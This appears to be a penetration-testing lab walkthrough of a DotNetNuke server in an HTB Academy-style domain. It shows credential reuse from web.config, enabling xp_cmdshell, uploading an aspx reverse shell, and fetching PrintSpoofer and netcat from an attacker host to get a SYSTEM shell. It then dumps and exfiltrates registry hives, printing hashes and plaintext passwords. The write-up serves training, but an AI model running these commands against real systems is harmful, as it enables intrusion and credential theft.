Looking at the web.config file from the DNN directory in the NFS share, we can find the administrator password:
```shell-session
root@dmz01:~/mnt/DNN# cat web.config 
<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
        <value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

Identifying the host names:
```shell-session
# proxychains crackmapexec smb 172.16.8.x -u Administrator -p D0tn31Nuk3R0ck$$@123
```

Accessing the DEV01 host through the browser with proxychains:
![[Pasted image 20240722094632.png]]

We can now login with the credentials found in the web.config file.

Found [this website](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/dotnetnuke-dnn) as reference to exploiting DNN.

Going to the profile page we can access SQL console from the settings:
![[Pasted image 20240722095843.png]]

The tester ran the following line to enable xp_cmdshell:
```
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

Now we can run commands:
![[Pasted image 20240722100106.png]]

We will go on another route.

Starting a listener on the ubuntu target machine:
```shell-session
root@dmz01:~/mnt# nc -nlvp 1234
Listening on 0.0.0.0 1234
```

Let's first download aspx reverse shell from [here](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx).

Now going to `Settings -> Security -> More -> More Security Settings` we can add asp, and aspx allowed extensions, and then hit save:
![[Pasted image 20240722103614.png]]

After that, going to the `/admin/file-management` page we can upload an aspx web shell.

Then we can click the file, or go to `/Portals/0/shell.aspx` in order to execute the reverse shell.

And we got a shell:
```shell-session
root@dmz01:~/mnt# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 172.16.8.20 51680
Spawn Shell...
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

Looking at the privileges we can see the seImpersonatePrivilege is enabled:
```powershell
PS C:\Users\Public> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Now we will transfer [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [nc.exe](https://github.com/int0x33/nc.exe/) to the machine:
```powershell
PS C:\Users\Public> Invoke-WebRequest http://172.16.8.120:9090/PrintSpoofer.exe -OutFile PrintSpoofer.exe
Invoke-WebRequest http://172.16.8.120:9090/PrintSpoofer.exe -OutFile PrintSpoofer.exe
PS C:\Users\Public> Invoke-WebRequest http://172.16.8.120:9090/nc64.exe -OutFile nc64.exe
Invoke-WebRequest http://172.16.8.120:9090/nc64.exe -OutFile nc64.exe
```

Starting a listener on the ubuntu machine:
```shell-session
root@dmz01:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

We can see the target is Windows sever 2019, so the machine isn't vulnerable to the JuicyPotato attack:
```powershell
PS C:\Users\Public> systeminfo
systeminfo

Host Name:                 ACADEMY-AEN-DEV
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free

<SNIP>

```

Now we will run PrintSpoofer on the target:
```powershell
PS C:\Users\Public> c:\Users\Public\PrintSpoofer.exe -c "C:\Users\Public\nc64.exe 172.16.8.120 4444 -e cmd"
c:\Users\Public\PrintSpoofer.exe -c "C:\Users\Public\nc64.exe 172.16.8.120 4444 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

We got a shell as SYSTEM:
```shell-session
root@dmz01:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.16.8.20 52114
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We can now copy the registry hives:
```cmd
C:\>reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\>reg.exe save hklm\system C:\system.save
reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\>reg.exe save hklm\security C:\security.save
reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

Now it's time to move the files to our machine:

Starting smb share on our machine:
```shell-session
# python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share here -user vk9guest -password vk9pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

We will use reverse port forwarding to connect to the share from the Windows machine:
```shell-session
# ssh -R 445:localhost:445 root@10.129.229.147 -i id_rsa 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

root@dmz01:~#
```

Next let's move the registry hives from the DEV01 host to the share:
```cmd
C:\>net use \\172.16.8.120\share /user:vk9guest vk9pass
net use \\172.16.8.120\share /user:vk9guest vk9pass
The command completed successfully.

C:\>move sam.save \\172.16.8.120\share
move sam.save \\172.16.8.120\share
        1 file(s) moved.

C:\>move security.save \\172.16.8.120\share
move security.save \\172.16.8.120\share
        1 file(s) moved.

C:\>move system.save \\172.16.8.120\share
move system.save \\172.16.8.120\share
        1 file(s) moved.
```

Finally we'll use secretsdump to dump the hashes:
```shell-session
# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:a63c91a66e7fdaf75a79bcefa62ae021b6da04819a211e044f4194a24c813f697b10f807b0af80e21ba35677dc1ebc1da1a0ea9829b863d40baf40f6b4c8456768ee22c8f8a68dffc89b70c7a18de9c4cd6d3f91e10af600d19be988b75f76d1d04b705c5678d2fde1c0e22a219f5400a7aaae9429aac6735aa8fe5fd8f8e8701657b310f770ba522bb7e3f1cdf83e3f0c0a9f583a9fa59de85fc6c693403011aacd03b62d5e3d67041f355d8fba25fac69a0c09b683437ad028dbd05b870dca74d2f0232e48c6c964e368e0975ca91ff796f154575a98c96e3597ac99aba5189741a231bfe41eb542d0386d61798da7
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:50849e24cf28249ec74808978f773046
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up...
```

We got a success connecting with the hporter user and the plaintext password:
```shell-session
# proxychains crackmapexec smb 172.16.8.20 -u hporter -p Gr8hambino!
[proxychains] config file found: /etc/proxychains4.conf

SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] INLANEFREIGHT.LOCAL\hporter:Gr8hambino!
```
